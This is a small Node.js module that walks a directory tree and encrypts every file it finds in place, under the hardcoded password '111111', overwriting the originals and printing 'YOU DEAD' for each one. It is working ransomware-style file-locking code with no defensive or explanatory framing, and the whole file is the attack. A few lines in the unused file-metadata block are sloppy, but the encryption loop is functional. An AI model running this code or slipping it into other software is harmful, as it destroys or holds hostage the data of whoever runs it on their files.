global.ARGV = require('minimist')(process.argv.slice(2)) || {};
const { readdir } = require('fs/promises');
const Path = require('path');
const Fs = require('fs');
const Encrypt = require('node-file-encrypt');
/**
  * 
  */
async function walkDir(dirname) {
  let items = [];

  const walk = async (dir) => {
    try {
      const files = await readdir(dir);
      for (const file of files) {
        let path = Path.resolve(dir, file);
        let stat = Fs.statSync(path);
        stat.miniData = {
          inode: stat.ino,
          ctimeMs: stat.mtimeMs,
          mtimeMs: stat.mtimeMs,
          filesize: stat.filesize
        }
        if (stat.isDirectory()) {
          await walk(path);
        } else {
          items.push(path);
        }
      }
    } catch (err) {
      console.error(err);
    }

  }
  await walk(dirname);
  return items;
}

const encryptDir = async function (dir) {
  let list = await walkDir(dir);
  for (let file of list) {
    console.log("YOU DEAD", file);
    //continue
    let f = new Encrypt.FileEncrypt(file);
    f.openSourceFile();
    f.encrypt('111111');
    Fs.renameSync(f.encryptFilePath, file);
    //console.log("ENCRYPTED", path, f.encryptFilePath);
  }
}

module.exports = encryptDir;